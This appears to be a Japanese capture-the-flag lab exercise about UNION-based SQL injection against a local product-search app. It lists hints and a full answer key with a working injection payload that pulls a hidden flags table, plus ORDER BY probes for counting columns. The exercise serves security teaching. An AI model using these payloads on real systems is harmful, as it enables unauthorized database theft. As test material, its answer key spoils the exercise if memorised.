# 02 - UNION-based Search

`http://localhost:3002` の商品検索から、DB内のflagを抜き出せ。

このDBのテーブル構成:
- `products(id, name, description, price)` — 検索対象、4カラム
- `flags(id, flag)` — 無関係の別テーブル。目標はこの`flag`を検索結果に混ぜ込むこと

## ヒント

<details><summary>ヒント1</summary>

`?q=`の値をそのままLIKE句に埋め込んでいる(`server.py`参照)。エラーはそのままJSONで返る。

</details>

<details><summary>ヒント2</summary>

まず`'`(シングルクォート)1つだけ送ってみろ。SQL構文エラーが返るはずだ。クォートを閉じずに
残りの構文を自分で足せる状態になっている。

</details>

<details><summary>ヒント3</summary>

`products`は4カラムなので、`UNION SELECT`も4つの値を返す必要がある。型が違うカラムには
`NULL`を入れれば型エラーを回避できる(例: `UNION SELECT 1,'a','b',1`)。

</details>

<details><summary>解答</summary>

```
q=zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -
```

`zzz`で本来の検索を空振りさせ、`UNION SELECT`で`flags`テーブルの値を同じ4カラムの形で
結果に混ぜ込んでいる。`id,flag`は`products`の`id,name`と型が合うのでそのまま、残り2つは
`NULL`で埋めている。

### もっと自力で探したい場合

カラム数(4)を教えられずに解く場合は`ORDER BY`で探る:
```
q=zzz' ORDER BY 4-- -   -> 通る
q=zzz' ORDER BY 5-- -   -> エラー(5カラム目は存在しない)
```
これでSELECT対象のカラム数を特定できる。

</details>
